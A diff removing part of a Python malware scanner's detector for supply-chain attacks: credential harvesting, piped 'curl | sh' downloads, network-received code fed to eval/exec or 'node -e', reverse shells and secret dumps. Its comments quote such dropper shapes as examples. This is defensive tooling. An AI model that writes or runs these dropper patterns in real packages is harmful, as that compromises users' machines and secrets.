-    -1 (at most _PS_EXEC_MAX_NAMES names are examined)."""
-    for k, m in enumerate(_PS_RE.finditer(text)):
-        if k >= _PS_EXEC_MAX_NAMES:
-            break
-        window = text[max(0, m.start() - _PS_EXEC_BACK):m.start()]
-        if any(_call_open(window[c.end():]) for c in _EXEC_CALL_RE.finditer(window)):
-            return m.start()
-    return -1
-
-
-def import_time_severity(reasons):
-    """'CRITICAL' when one of `reasons` (import_time_risk's) is a strong one
-    (see _STRONG_IMPORT_REASONS), else 'MAJOR'."""
-    return "CRITICAL" if any(r.startswith(_STRONG_IMPORT_REASONS) for r in reasons) else "MAJOR"
-
-
-def import_time_risk(text, lang=None):
-    """-> (reasons, line): why code that runs on import looks hostile by
-    the weaker test above ([] if not), and the 1-based line of the first
-    sign. `text` has \\n line endings; `lang` 'py' or 'js' reads it without
-    its prose (see _import_code). It is read again with the strings it
-    decodes as it runs decoded (decoded_view; a reason found only there says
-    so). import_time_severity grades them."""
-    reasons, line = _import_time_reading(text, lang)
-    view = decoded_view(text)
-    if view != text:
-        more, at = _import_time_reading(view, lang)
-        for r in more:
-            if r not in reasons:
-                reasons.append(r + _DV_NOTE)
-                line = line or at
-    return reasons, line
-
-
-def _import_time_reading(text, lang):
-    reasons, line = _import_time_risk(text)
-    if reasons and lang in ("py", "js"):
-        code = _import_code(text, lang)
-        if code != text:
-            reasons, line = _import_time_risk(code)
-    return reasons, line
-
-
-def _import_harvest_at(text):
-    """Where `text` harvests (see _IMPORT_HARVEST_RE; also a copy of the
-    whole environment it serializes, 0.1.8), else -1."""
-    harvest = (_IMPORT_HARVEST_RE.search(text)
-               if any(needle in text for needle in _IMPORT_HARVEST_NEEDLES) else None)
-    return harvest.start() if harvest else env_copy_serialized_at(text)
-
-
-def _import_time_risk(text):
-    reasons, line = [], None
-    harvest = _import_harvest_at(text)
-    if harvest >= 0:
-        service = _EXFIL_SERVICE_RE.search(text)
-        if service:
-            reasons.append("reads credentials or the whole environment and sends them to "
-                           f"an exfiltration service ({service.group(0)[:40]})")
-        elif _NETWORK_RE.search(text):
-            reasons.append("reads credentials or the whole environment and sends data over the network")
-        if reasons:
-            line = text.count("\n", 0, harvest) + 1
-    if "curl" in text or "wget" in text:
-        for i, row in enumerate(text.split("\n")):
-            if _runs_download_through_shell(row):
-                reasons.append("runs a downloaded script through a shell")
-                line = line or i + 1
-                break
-    received = _received_code_kind(text)
-    if received is not None:
-        reasons.append(_DL_CATEGORY_REASON[received[1]])
-        line = line or received[0]
-    dropped = _downloads_and_runs(text)
-    if dropped is not None:
-        interp = "Python" if _PY_RUN_RE.search(text) else dropped[1]
-        reasons.append(f"downloads a script and runs it with {interp}" if interp
-                       else "downloads a file and then runs it")
-        line = line or dropped[0]
-    decoded = _decodes_and_runs(text)
-    if decoded is not None:
-        interp = "Python" if _PY_RUN_RE.search(text) else decoded[1]
-        reasons.append(f"writes code it decodes to a file and runs it with {interp}" if interp
-                       else "writes a file it decodes and runs it")
-        line = line or decoded[0]
-    signs = []                        # (offset, reason) of the shapes no library needs
-    ps = powershell_risk(text)
-    if ps:
-        at = _powershell_run_at(text)
-        if at >= 0:
-            signs.append((at, ps[0]))
-    if received is None or received[1] != "run":
-        at = stager_at(text)
-        if at >= 0:
-            signs.append((at, "carries a script that downloads and runs code"))
-    at = reverse_shell_at(text)
-    if at >= 0:
-        signs.append((at, "opens a reverse shell"))
-    host = _HOST_INFO_RE.search(text)
-    if host:
-        capture = capture_service(text)
-        if capture:
-            signs.append((host.start(), "sends the machine's user or host name to a data-capture service "
-                                        f"({capture.group(0)[:40]})"))
-    at = runs_own_source_at(text)
-    if at >= 0:
-        signs.append((at, "runs code it reads back from its own file or a data file shipped with it"))
-    if dumps_workflow_secrets(text):
-        signs.append((_SECRETS_DUMP_RE.search(text).start(),
-                      "carries a GitHub Actions workflow that dumps every repository secret"))
-    signs.extend(_exfil_signs(text, host))
-    for at, reason in signs:
-        reasons.append(reason)
-        line = line or text.count("\n", 0, at) + 1
-    return reasons, line
-
-
-def _runs_download_through_shell(row):
-    """Does this line hand a download piped into a shell, or substituted into
-    a shell's or an interpreter's command line, to an exec call
-    (`execSync("curl … | sh")`, `os.system("wget -qO- … | bash")`,
-    `execSync('bash -c "$(curl -fsSL …)"')`)? A CLI's help text showing
-    `curl … | sh` does not."""
-    return (("curl" in row or "wget" in row) and _EXEC_CALL_RE.search(row) is not None
-            and (_pipes_download_to_shell(row) or runs_substituted_download(row)))
-
-
-# ---------------- Code that runs what it receives over the network ----------------
-# TrapDoor-style import-time code downloads code and runs it:
-# subprocess.run(['node', '-e', urlopen(u).read().decode()]), exec(requests.get(u)
-# .text), eval(body) after https.get's data events, new Function(await r.text()).
-# The pipe test above sees none of these: no shell, no curl. runs_received_code
-# follows a value received over the network — a download, a socket's or a
-# server's data — through the names it is assigned to, callback parameters,
-# `with … as` and `for` bindings and the functions that return it, to a runner
-# that takes it whole as code: eval / exec / new Function / vm, a shell
-# (os.system, execSync, a shell=True call), or an interpreter's inline code
-# (['node', '-e', code], [sys.executable, '-c', code], `python -c "{code}"`).
-# A value put into a larger string (`npm i pkg@${version}`, '(' + text + ')')
-# is not code received, and neither is a file it was saved to. A string
-# literal's contents are read as code too (a program for `node -e` is written
-# in one, and quotes do not always pair as the language pairs them). Install
-# scripts fail on it (install_script_risk), import-time code gets the weaker
-# SC-IMPORT-RISK (import_time_risk). On 66,000 installed JavaScript and Python
-# files (npm, pnpm, yarn, typescript, webpack, next, jest, the AI SDKs, pip,
-# setuptools, requests, httpx, the CPython library) it found nothing.
-#
-# Bounds: a value is followed for _DL_WINDOW rows; a call's arguments are read
-# for _DL_ARG_SPAN characters, and so is each argument's value (after its
-# leading whitespace, `await`s and parentheses); a row longer than
-# _DL_LONG_ROW is minified code, where only a download written straight into
-# a runner counts (a runner that starts within _DL_LOOKBACK characters before
-# a network name). Only rows near a network name, or naming a value followed,
-# are read. A row is read in one pass over its brackets, and no pattern
-# backtracks more than a bounded amount, so a text costs about one pass over
-# it whatever it holds: a large bundle, or a text built to make the follower
-# work. The patterns and name sets live in received_spec.json (see the loader
-# below); the assertions in its alternative pairs are literal (\b, (?<![\w$.])).
-
-
-def _dl_alternatives(pairs, tail=""):
-    """(exact, candidate) regexes from (assertion, body) alternatives. The
-    candidate leaves out the leading assertions, so re skips ahead by the
-    first character (several times faster on a large bundle); an exact match
-    starts where a candidate one does, and _dl_finditer confirms each."""
-    group = "(?:{})" if tail else "{}"
-    return (re.compile(group.format("|".join(a + b for a, b in pairs)) + tail),
-            re.compile(group.format("|".join(b for _a, b in pairs)) + tail))
-
-
-def _dl_finditer(pair, row, pos=0, endpos=None):
-    """The exact regex's matches in `row` that start in [pos, endpos) — as
-    finditer would give them — found through the candidate regex (whose match
-    must end by endpos)."""
-    exact, cand = pair
-    end = len(row) if endpos is None else endpos
-    while True:
-        m = cand.search(row, pos, end)
-        if m is None:
-            return
-        e = exact.match(row, m.start())
-        if e is None:
-            pos = m.start() + 1
-            continue
-        yield e
-        pos = e.end() if e.end() > e.start() else e.start() + 1
-
-
-# The received-code detector's shared data — name sets, character sets and
-# limits — is authored once in received_spec.json and loaded by both engines
-# (the npm engine reads its synced copy, js/src/lib/received-spec.json). A
-# needle or a limit is edited in that one file; scripts/sync-received-spec.py
-# copies it to the npm package and tests/architecture/test_received_spec.py
-# fails if the copies drift. The patterns themselves are still defined below.
-with open(os.path.join(os.path.dirname(__file__), "received_spec.json"), encoding="utf-8") as _dl_spec_f:
-    _DL_SPEC = json.load(_dl_spec_f)
-_DL_SPEC_ARRAYS, _DL_SPEC_CHARS, _DL_SPEC_LIMITS = _DL_SPEC["arrays"], _DL_SPEC["charstrings"], _DL_SPEC["limits"]
-_DL_SPEC_PATTERNS, _DL_SPEC_ALTS = _DL_SPEC["patterns"], _DL_SPEC["alternatives"]
-_DL_RE_FLAGS = {"i": re.I, "m": re.M, "s": re.S}
-
-
-def _dl_flags(spec):
-    f = 0
-    for ch in spec:
-        f |= _DL_RE_FLAGS[ch]
-    return f
-
-
-def _dl_re(name):
-    """A plain received-code pattern, compiled from the spec."""
-    p = _DL_SPEC_PATTERNS[name]
-    return re.compile(p["src"], _dl_flags(p["flags"]))
-
-
-def _dl_group(name):
-    """An (exact, candidate) alternative pair built from the spec (see
-    _dl_alternatives); `extends` prepends another group's pairs."""
-    g = _DL_SPEC_ALTS[name]
-    base = _DL_SPEC_ALTS[g["extends"]]["pairs"] if "extends" in g else []
-    pairs = [tuple(pr) for pr in list(base) + g["pairs"]]
-    return _dl_alternatives(pairs, g.get("tail", ""))
-
-
-# Every source match, and every import of a network module, holds a network
-# needle; every runner a run needle; a deserializer a deserial needle
-# (pickle / marshal / a full yaml.load / node-serialize unserialize, CWE-502);
-# a dynamic import an import needle (import(x), require(x), __import__(x),
-# importlib.import_module(x)). Only rows holding one are read. The patterns and
-# name sets are the spec's; the notes there say what each matches.
-_DL_SOURCE = _dl_group("_DL_SOURCE")            # a value received over the network
-_DL_SOURCE_RE, _DL_SOURCE_CANDIDATE_RE = _DL_SOURCE
-_DL_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_NEEDLES"])
-_DL_NEEDLE_RE = re.compile("|".join(re.escape(n) for n in sorted(_DL_NEEDLES, key=lambda n: (-len(n), n))))
-_DL_RUN_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_RUN_NEEDLES"])
-_DL_DESERIAL_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_DESERIAL_NEEDLES"])
-_DL_IMPORT_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_IMPORT_NEEDLES"])
-_DL_SINK_NEEDLES = _DL_RUN_NEEDLES + _DL_DESERIAL_NEEDLES + _DL_IMPORT_NEEDLES   # the file-level gate
-_DL_MODULE_VALUE_RE = _dl_re("_DL_MODULE_VALUE_RE")
-_DL_FUNCTION_VALUE_RE = _dl_re("_DL_FUNCTION_VALUE_RE")
-_DL_IMPORT_RE = _dl_re("_DL_IMPORT_RE")
-_DL_PY_NET_MODULES = frozenset(_DL_SPEC_ARRAYS["_DL_PY_NET_MODULES"])
-_DL_LONG_ROW = _DL_SPEC_LIMITS["_DL_LONG_ROW"]
-_DL_WINDOW = _DL_SPEC_LIMITS["_DL_WINDOW"]
-_DL_ARG_SPAN = _DL_SPEC_LIMITS["_DL_ARG_SPAN"]
-_DL_LOOKBACK = _DL_SPEC_LIMITS["_DL_LOOKBACK"]
-_DL_NAMED_SEARCHES = _DL_SPEC_LIMITS["_DL_NAMED_SEARCHES"]   # names looked up by a search each; the rest via an index
-_DL_PHASES = _DL_SPEC_LIMITS["_DL_PHASES"]                   # readings of a row's quotes begun at a call's '('
-_DL_CHAIN_RE = _dl_re("_DL_CHAIN_RE")
-_DL_HEAD_RE = _dl_re("_DL_HEAD_RE")
-_DL_WORD_RUN_RE = _dl_re("_DL_WORD_RUN_RE")
-_DL_STR_RE = _dl_re("_DL_STR_RE")
-_DL_TEMPLATE_HOLE_RE = _dl_re("_DL_TEMPLATE_HOLE_RE")
-_DL_FSTRING_HOLE_RE = _dl_re("_DL_FSTRING_HOLE_RE")
-_DL_PREFIX_CHARS = frozenset(_DL_SPEC_CHARS["_DL_PREFIX_CHARS"])
-_DL_BIND_RE = _dl_re("_DL_BIND_RE")
-_DL_PARAMS_RE = _dl_re("_DL_PARAMS_RE")
-_DL_FN_HEADER_RE = _dl_re("_DL_FN_HEADER_RE")
-_DL_NAME_RE = _dl_re("_DL_NAME_RE")
-_DL_DEFAULT_RE = _dl_re("_DL_DEFAULT_RE")
-_DL_DOT_RE = _dl_re("_DL_DOT_RE")
-_DL_NOT_NAMES = frozenset(_DL_SPEC_ARRAYS["_DL_NOT_NAMES"])
-_DL_RUNNER = _dl_group("_DL_RUNNER")            # a call that runs its argument as code
-_DL_RUNNER_RE, _DL_RUNNER_CANDIDATE_RE = _DL_RUNNER
-_DL_SHELL_TRUE_RE = _dl_re("_DL_SHELL_TRUE_RE")
-_DL_SHELL_CALL_RE = _dl_re("_DL_SHELL_CALL_RE")
-_DL_SHELL_ARG_RE = _dl_re("_DL_SHELL_ARG_RE")
-_DL_RUNNER_SHELL = _dl_group("_DL_RUNNER_SHELL")   # the runners plus run-family calls (when the file has shell=True)
-_DL_RUNNER_SHELL_RE, _DL_RUNNER_SHELL_CANDIDATE_RE = _DL_RUNNER_SHELL
-_DL_DESERIAL = _dl_group("_DL_DESERIAL")        # a deserializer that runs code embedded in its argument (CWE-502)
-_DL_DESERIAL_RE, _DL_DESERIAL_CANDIDATE_RE = _DL_DESERIAL
-_DL_IMPORT_SINK = _dl_group("_DL_IMPORT_SINK")  # a dynamic import of a received specifier
-_DL_IMPORT_SINK_RE, _DL_IMPORT_SINK_CANDIDATE_RE = _DL_IMPORT_SINK
-_DL_FROM_IMPORT_RE = _dl_re("_DL_FROM_IMPORT_RE")   # a Python from-import line: the bare import( sink is skipped there
-_DL_BARE_IMPORT_RE = _dl_re("_DL_BARE_IMPORT_RE")
-_DL_ALIAS_RE = _dl_re("_DL_ALIAS_RE")           # a runner-alias definition (name = a direct code-runner reference)
-_DL_ALIAS_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_ALIAS_NEEDLES"])
-_DL_ALIAS_MAX = _DL_SPEC_LIMITS["_DL_ALIAS_MAX"]       # a file's alias names, at most
-_DL_DEFINING = tuple(_DL_SPEC_ARRAYS["_DL_DEFINING"])
-_DL_INTERP = _dl_group("_DL_INTERP")            # an interpreter given inline code as argv (['node','-e',CODE])
-_DL_INTERP_RE, _DL_INTERP_CANDIDATE_RE = _DL_INTERP
-_DL_EMBED_RE = _dl_re("_DL_EMBED_RE")           # ... or written into its command line (`node -e ${code}`)
-_DL_LEAD_RE = _dl_re("_DL_LEAD_RE")
-_DL_CALLEE_RE = _dl_re("_DL_CALLEE_RE")
-_DL_CALLEE_CHARS = frozenset(_DL_SPEC_CHARS["_DL_CALLEE_CHARS"])
-_DL_BRACKET_RE = _dl_re("_DL_BRACKET_RE")
-# Statements over several rows (0.1.8). The detector reads a row at a time,
-# so a call whose arguments a formatter put on the rows below it
-#     r = subprocess.run(
-#         ['curl', '-sL', URL],
-#         capture_output=True)
-# or a member chain continued on the next rows (prettier's `axios\n.post(…)
-# \n.then((r) => {`) hid the source from the row that binds it: the rows
-# are joined for a second reading (_dl_join_rows). So are an environment
-# variable's reads and writes by name, which carry a received value from one
-# statement to the next (os.environ['P'] = r.text … exec(os.getenv('P')))
-# the way an assignment does: each is read as one name, environ.P or
-# process.env.P (_dl_env_canonical); and so is a call through a comma
-# expression, (0, ns.fn)(…), which is how TypeScript and Babel call every
-# imported function (_dl_comma_calls). All keep the text's length, so the
-# second reading's offsets are the text's.
-_DL_JOIN_ROWS = _DL_SPEC_LIMITS["_DL_JOIN_ROWS"]        # rows one statement is joined over, at most
-_DL_JOIN_CHARS = _DL_SPEC_LIMITS["_DL_JOIN_CHARS"]      # characters of a joined statement, at most
-# a longer text (a bundle) is read once: the second reading doubled the time
-# of the benign bundles (playwright-core's 3.5 MB coreBundle.js) and found
-# nothing there; a minified payload is the first reading's (its long rows)
-_DL_LOGICAL_MAX_CHARS = _DL_SPEC_LIMITS["_DL_LOGICAL_MAX_CHARS"]
-_DL_JOIN_CHAIN_RE = _dl_re("_DL_JOIN_CHAIN_RE")
-_DL_JOIN_COMMENT_RE = _dl_re("_DL_JOIN_COMMENT_RE")
-_DL_JOIN_BLOCK_RE = _dl_re("_DL_JOIN_BLOCK_RE")
-_DL_ENV_PY_RE = _dl_re("_DL_ENV_PY_RE")
-_DL_ENV_JS_RE = _dl_re("_DL_ENV_JS_RE")
-_DL_COMMA_CALL_RE = _dl_re("_DL_COMMA_CALL_RE")
-# (0.1.8, the follower's adversarial pass) and members read by name,
-# getattr(m, 'pull') and m['pull'] as m.pull; and a code runner handed to a
-# call as its last argument, p.then(eval) or res.on('data', eval), as the
-# call it makes, (_v)=>eval(_v) — a dropper's value reaches the runner
-# without a name the first reading follows.
-_DL_GETATTR_RE = _dl_re("_DL_GETATTR_RE")
-_DL_MEMBER_RE = _dl_re("_DL_MEMBER_RE")
-_DL_CALLBACK_RE = _dl_re("_DL_CALLBACK_RE")
-_DL_CALLBACK_NEEDLES = ("eval", "Function", "exec", "runIn")
-_DL_SPACE_RE_ANY = re.compile(r"[ \t]+")
-# the patterns built around names at run time (each name escaped): another
-# file's runner handed to a call as its last argument (_dl_callbacks), a name
-# standing whole (_DlNamed), a call of a runner alias (_dl_kind)
-_DL_RUNNER_ARG_HEAD = r"(?<=[(,])[ \t]*(?P<r>"
-_DL_RUNNER_ARG_TAIL = r")[ \t]*(?=\)(?![ \t]*\())"
-_DL_NAMED_MID = r"(?<![\w$]"
-_DL_NAMED_TAIL = r")(?![\w$])"
-_DL_ALIAS_CALL_HEAD = r"""(?<![\w$.])("""
-_DL_ALIAS_CALL_TAIL = r""")\s*\("""
-
-
-def _dl_blank_literal(m):
-    s = m.group()
-    return s[0] + " " * (len(s) - 2) + s[-1] if len(s) >= 2 else s
-
-
-def _dl_join_code(row):
-    """`row` with its string literals' contents blanked and a trailing
-    comment cut: what its brackets are counted on."""
-    masked = _DL_STR_RE.sub(_dl_blank_literal, row) if ("'" in row or '"' in row or "`" in row) else row
-    m = _DL_JOIN_COMMENT_RE.search(masked) if ("#" in masked or "//" in masked) else None
-    return masked if m is None else masked[:m.start()]
-
-
-def _dl_join_plain(code):
-    """Can a row with this code be part of a joined statement: it opens no
-    function, class or block (no '{' left open, no trailing ':')?"""
-    end = code.rstrip()
-    return (_DL_JOIN_BLOCK_RE.search(code) is None and code.count("{") == code.count("}")
-            and not end.endswith((":", "{")))
-
-
-def _dl_join_rows(text):
-    """(joined, firsts): `text` with the line breaks inside a statement that
-    spans rows made spaces (see above) — a call's arguments continued on
-    the rows below its '(' until it closes, a row continued with a
-    backslash, and a member chain continued on the next row — and the index
-    of the text's row each joined row starts on (None when nothing was
-    joined). A statement is joined whole or not at all, over at most
-    _DL_JOIN_ROWS rows and _DL_JOIN_CHARS characters, and never through a
-    function's or a block's body."""
-    rows = text.split("\n")
-    n = len(rows)
-    if n < 2:
-        return text, None
-    codes = {}
-
-    def code(j):
-        c = codes.get(j)
-        if c is None:
-            c = codes[j] = _dl_join_code(rows[j])
-        return c
-
-    join = bytearray(n)
-    k = 0
-    while k < n - 1:
-        row = rows[k]
-        if "(" not in row and "[" not in row and "\\" not in row:
-            k += 1                                      # (it can neither open a call nor continue with a backslash)
-            continue
-        c = code(k)
-        if c.rstrip().endswith("\\") and len(rows[k]) + 1 + len(rows[k + 1]) <= _DL_JOIN_CHARS:
-            join[k] = 1
-            k += 1
-            continue
-        depth = c.count("(") + c.count("[") - c.count(")") - c.count("]")
-        if depth > 0 and len(rows[k]) <= _DL_JOIN_CHARS and _dl_join_plain(c):
-            j, total, done = k + 1, len(rows[k]), False
-            while j < n and j - k < _DL_JOIN_ROWS:
-                cj = code(j)
-                total += 1 + len(rows[j])
-                if total > _DL_JOIN_CHARS or not _dl_join_plain(cj):
-                    break
-                depth += cj.count("(") + cj.count("[") - cj.count(")") - cj.count("]")
-                if depth <= 0:
-                    done = True
-                    break
-                j += 1
-            if done:
-                for t in range(k, j):
-                    join[t] = 1
-                k = j
-                continue
-        k += 1
-    for j in range(1, n):
-        if join[j - 1] or _DL_JOIN_CHAIN_RE.match(rows[j]) is None or not code(j - 1).strip():
-            continue
-        first, total = j - 1, len(rows[j - 1]) + 1 + len(rows[j])
-        while first > 0 and join[first - 1] and j - first < _DL_JOIN_ROWS:
-            first -= 1
-            total += len(rows[first]) + 1
-        if (first == 0 or not join[first - 1]) and j - first < _DL_JOIN_ROWS and total <= _DL_JOIN_CHARS:
-            join[j - 1] = 2
-    if not any(join):
-        return text, None
-    # A member chain's rows are joined without the break and the indent
-    # between them (`axios` + `.post(…)` reads axios.post(…), as the source
-    # patterns want it); what is taken out is put back at the end of the
-    # joined statement, so each row still starts where the text's does.
-    out, pad, firsts = [rows[0]], 0, [0]
-    for k in range(1, n):
-        how = join[k - 1]
-        if how == 2:
-            row = rows[k]
-            body = row.lstrip(" \t")
-            pad += 1 + len(row) - len(body)
-            out.append(body)
-        elif how:
-            out.append(" ")
-            out.append(rows[k])
-        else:
-            out.append(" " * pad + "\n")
-            pad = 0
-            out.append(rows[k])
-            firsts.append(k)
-    out.append(" " * pad)
-    return "".join(out), firsts
-
-
-def _dl_env_canonical(text):
-    """`text` with each environment variable read or written by name as one
-    name (see above): environ.NAME in Python, process.env.NAME in
-    JavaScript, padded with spaces to the length it replaces."""
-    if "environ" in text or "getenv" in text:
-        text = _DL_ENV_PY_RE.sub(lambda m: ("environ." + (m.group("a") or m.group("b") or m.group("c"))).ljust(
-            len(m.group())), text)
-    if "process" in text and "env" in text:
-        text = _DL_ENV_JS_RE.sub(lambda m: ("process.env." + m.group("a")).ljust(len(m.group())), text)
-    return text
-
-
-def _dl_comma_calls(text):
-    """`text` with each call through a comma expression — (0, ns.fn)(…),
-    TypeScript's and Babel's call of an imported function — read as the
-    call it is, ns.fn(…), padded with spaces to the length it replaces."""
-    if "(0" not in text:
-        return text
-    return _DL_COMMA_CALL_RE.sub(lambda m: _DL_SPACE_RE_ANY.sub("", m.group("c")).ljust(len(m.group())), text)
-
-
-def _dl_members(text):
-    """`text` with each member read by name as a dotted member (see above):
-    getattr(obj, 'name') and obj['name'] as obj.name, padded with spaces to
-    the length they replace."""
-    if "getattr" in text:
-        text = _DL_GETATTR_RE.sub(lambda m: (_DL_SPACE_RE_ANY.sub("", m.group("o")) + "."
-                                             + (m.group("a") or m.group("b"))).ljust(len(m.group())), text)
-    if "['" in text or '["' in text:
-        text = _DL_MEMBER_RE.sub(lambda m: ("." + (m.group("a") or m.group("b"))).ljust(len(m.group())), text)
-    return text
-
-
-def _dl_callbacks(text, runners=()):
-    """`text` with each code runner handed to a call as its last argument
-    (see above) — and each of `runners`, a function of another file of the
-    package that runs its argument (the cross-file follower's) — read as the
-    call it makes: (_v)=>eval(_v). Its row gets longer; its line is the same."""
-    if ")" not in text:
-        return text
-    if any(n in text for n in _DL_CALLBACK_NEEDLES):
-        text = _DL_CALLBACK_RE.sub(lambda m: "(_v)=>" + _DL_SPACE_RE_ANY.sub("", m.group("r")) + "(_v)", text)
-    names = [n for n in runners if n in text]
-    if names:
-        rx = re.compile(_DL_RUNNER_ARG_HEAD + "|".join(re.escape(n) for n in sorted(names)) + _DL_RUNNER_ARG_TAIL)
-        text = rx.sub(lambda m: "(_v)=>" + m.group("r") + "(_v)", text)
-    return text
-
-
-def _dl_logical(text, runners=()):
-    """(alt, firsts): the second reading's text (see above) — statements
-    joined, environment variables and members read as names, (0, f)(…) as
-    f(…), each padded to the length it replaces, and a runner handed to a
-    call as the call it makes — and _dl_join_rows' firsts."""
-    joined, firsts = _dl_join_rows(text)
-    return _dl_comma_calls(_dl_callbacks(_dl_members(_dl_env_canonical(joined)), runners)), firsts
-
-
-def _dl_lhs_names(lhs):
-    """The names an assignment's left side binds (a member chain stays whole)."""
-    lhs = lhs.strip()
-    if lhs[:1] in "{[":
-        return [n for n in _DL_NAME_RE.findall(lhs) if n not in _DL_NOT_NAMES]
-    out = []
-    for part in lhs.split(","):
-        part = _DL_DOT_RE.sub(".", part.strip())
-        if part and part not in _DL_NOT_NAMES:
-            out.append(part)
-    return out
-
-
-def _dl_defined_here(row, i):
-    """Is the call at row[i] the name in a definition: def exec(…),
-    function exec(…), async exec(…)?"""
-    j = i
-    while j > 0 and row[j - 1].isspace():
-        j -= 1
-    if j == i:
-        return False
-    for word in _DL_DEFINING:
-        s = j - len(word)
-        if s >= 0 and row.startswith(word, s) and (s == 0 or not (row[s - 1] == "_" or row[s - 1].isalnum())):
-            return True
-    return False
-
-
-def _dl_any(offsets, lo, hi):
-    """Is one of the sorted offsets in [lo, hi)?"""
-    i = bisect.bisect_left(offsets, lo)
-    return i < len(offsets) and offsets[i] < hi
-
-
-def _dl_within(starts, ends, lo, hi):
-    """Is one of the spans (sorted, not overlapping) inside [lo, hi)?"""
-    i = bisect.bisect_left(starts, lo)
-    return i < len(starts) and ends[i] <= hi
-
-
-class _DlTaint:
-    """The names holding a received value, with the row each was last bound
-    on (followed for _DL_WINDOW rows), and the names that carry the network
-    wherever they are used (network modules, functions returning a received
-    value). `heads` holds their first names: a row naming none of them uses
-    none."""
-
-    def __init__(self, always):
-        self.always = set(always)
-        self.at = {}
-        self.heads = {n.split(".")[0] for n in self.always}
-
-    def name_live(self, name, row):
-        """Is `name` such a name at `row`?"""
-        if name in self.always:
-            return True
-        t = self.at.get(name)
-        return t is not None and row - t <= _DL_WINDOW
-
-    def live(self, chain, row):
-        """Is `chain`, or a chain it is a property of, such a name at `row`?"""
-        acc = None
-        for part in _DL_DOT_RE.split(chain):
-            acc = part if acc is None else acc + "." + part
-            if self.name_live(acc, row):
-                return True
-        return False
-
-
-def _dl_carried(row, i, taint, k):
-    """Does the value at row[i] begin with a received value — a source or a
-    tainted name (None: sources only) — seen through await, parentheses and
-    up to three wrapping calls (compile(code, …), Buffer.from(body, 'base64'))?
-    It is read for _DL_ARG_SPAN characters after the whitespace, `await`s
-    and parentheses it starts with."""
-    i = _DL_LEAD_RE.match(row, i).end()
-    limit = min(len(row), i + _DL_ARG_SPAN)
-    for n in range(4):
-        if n:
-            i = _DL_LEAD_RE.match(row, i, limit).end()
-        m = _DL_CALLEE_RE.match(row, i, limit)
-        if m is None:
-            return False
-        if _DL_SOURCE_RE.search(row, i, m.end()) or (taint is not None and taint.live(m.group("chain"), k)):
-            return True
-        if m.group("call") is None:
-            return False
-        i = m.end()
-    return False
-
-
-class _DlCode:
-    """row[lo:hi] read as code: its text with each string literal's contents
-    blanked (the quotes kept, so offsets hold), and the literals' spans. A
-    literal's contents are read as code too, on demand: quotes do not always
-    pair as the language pairs them (an apostrophe in a comment, a regex
-    literal), and a program for `node -e` is written in one. Each read once,
-    on demand: its brackets matched (each opener's closer, the commas
-    directly inside it, the innermost '(' open at given offsets), its member
-    chains with those a name reaches, and its template literals and f-strings
-    interpolating a live chain. Brackets match whatever their kind; offsets
-    are the row's."""
-    __slots__ = ("row", "lo", "hi", "lit_s", "lit_e", "code", "close", "opener", "commas", "open_paren", "es",
-                 "inner", "by", "live", "holes")
-
-    def __init__(self, row, lo, hi):
-        self.row, self.lo, self.hi = row, lo, hi
-        parts, self.lit_s, self.lit_e, at = [], [], [], lo
-        for m in _DL_STR_RE.finditer(row, lo, hi):
-            s, e = m.span()
-            parts.append(row[at:s + 1])
-            parts.append(" " * (e - s - 2))
-            at = e - 1
-            self.lit_s.append(s)
-            self.lit_e.append(e)
-        parts.append(row[at:hi])
-        self.code = "".join(parts)
-        self.close = self.opener = self.commas = None
-        self.open_paren, self.es, self.inner = {}, {}, {}
-        self.by, self.live, self.holes = None, [], None
-
-    def literal_at(self, p):
-        """The index of the literal whose contents hold offset p, else -1."""
-        i = bisect.bisect_right(self.lit_s, p) - 1
-        return i if i >= 0 and self.lit_s[i] < p < self.lit_e[i] - 1 else -1
-
-    def segment_at(self, p):
-        """The code holding offset p: this, or a literal's contents read as code."""
-        i = self.literal_at(p)
-        if i < 0:
-            return self
-        seg = self.inner.get(i)
-        if seg is None:
-            seg = self.inner[i] = _DlCode(self.row, self.lit_s[i] + 1, self.lit_e[i] - 1)
-        return seg.segment_at(p)
-
-    def brackets(self, queries=()):
-        """Match the brackets, once; `queries`: sorted offsets to find the
-        innermost open '(' at (in open_paren; None where there is none)."""
-        if self.close is not None:
-            return
-        close, opener, commas, answers = {}, {}, {}, self.open_paren
-        stack, parens, qi, lo = [], [], 0, self.lo
-        for m in _DL_BRACKET_RE.finditer(self.code):
-            q, ch = m.start() + lo, m.group()
-            while qi < len(queries) and queries[qi] <= q:
-                answers[queries[qi]] = parens[-1] if parens else None
-                qi += 1
-            if ch == ",":
-                if stack:
-                    commas.setdefault(stack[-1], []).append(q)
-            elif ch in "([{":
-                stack.append(q)
-                if ch == "(":
-                    parens.append(q)
-            elif stack:
-                o = stack.pop()
-                if parens and parens[-1] == o:
-                    parens.pop()
-                close[o] = q
-                opener[q] = o
-        for p in queries[qi:]:
-            answers[p] = parens[-1] if parens else None
-        self.close, self.opener, self.commas = close, opener, commas
-
-    def expr_start(self, j):
-        """Where the expression a '(' at offset j is applied to starts —
-        `https.get` for `https.get(`, `fetch(u).then` for `fetch(u).then(`, a
-        group of brackets skipped whole — or None when that runs into a ')'
-        or ']' without an opener. Each offset is walked once."""
-        memo, code, lo, n = self.es, self.code, self.lo, len(self.code)
-        path, q = [], j
-        while True:
-            res = memo.get(q, memo)
-            if res is not memo:
-                break
-            path.append(q)
-            r = q - lo
-            if r == 0:
-                res = q
-                break
-            ch = code[r - 1]
-            if ch in _DL_CALLEE_CHARS:
-                q -= 1
-            elif ch == ")" or ch == "]":
-                o = self.opener.get(q - 1)
-                if o is None:
-                    res = None
-                    break
-                q = o
-            elif (ch == " " or ch == "\t") and ((r < n and code[r] == ".") or (r >= 2 and code[r - 2] == ".")):
-                q -= 1                                  # `a . b`, a chain's indentation
-            else:
-                res = q
-                break
-        for p in path:
-            memo[p] = res
-        return res
-
-    def index(self, taint, k):
-        """Index the member chains, and find those the taint reaches at row k."""
-        self.by = by = _dl_chain_index(self.code, self.lo)
-        self.live = sorted(s for name, offs in by.items() if taint.name_live(name, k) for s in offs)
-
-    def bound(self, name):
-        """`name` is now live: the chains it starts are too."""
-        for s in self.by.get(name, ()):
-            bisect.insort(self.live, s)
-
-    def live_holes(self, taint, k):
-        """(starts, ends) of the template literals and f-strings that
-        interpolate a chain the taint reaches at row k."""
-        if self.holes is None:
-            starts, ends, row = [], [], self.row
